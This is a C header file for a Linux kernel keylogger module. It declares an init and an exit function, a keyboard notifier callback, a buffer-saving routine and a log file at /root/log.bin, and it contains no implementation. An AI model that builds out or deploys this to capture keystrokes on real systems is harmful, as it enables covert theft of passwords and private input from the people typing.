#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <asm/uaccess.h>
#include <asm/segment.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/buffer_head.h>

#define LOG_FILE_PATH "/root/log.bin"
#define LOG_MAX_SIZE 1048576
void keylogger_exit(void);
int keylogger_init(void);
int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param);
int save_buffer(void);
struct notifier_block nb = {
  .notifier_call = kbd_notifier
};

#endif
